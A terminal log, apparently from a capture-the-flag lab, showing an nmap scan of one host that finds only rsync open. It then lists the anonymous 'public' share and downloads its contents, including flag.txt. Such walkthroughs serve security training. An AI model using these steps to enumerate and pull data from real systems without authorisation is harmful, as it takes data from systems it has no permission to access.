```
$ nmap -p- -sC -sV -A $target               
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 21:26 CEST
Nmap scan report for 10.129.228.37
Host is up (0.032s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.85 seconds
                                                                                                                                                                                
┌──(neutron㉿kali)-[~]
└─$ rsync -l rsync://10.129.228.37:873/
public          Anonymous Share
                                                                                                                                                                                
┌──(neutron㉿kali)-[~]
└─$ rsync -r rsync://10.129.228.37:873/public .                   
                                                                                                                                                                                
┌──(neutron㉿kali)-[~]
└─$ ls
Desktop  Documents  Downloads  flag.txt
```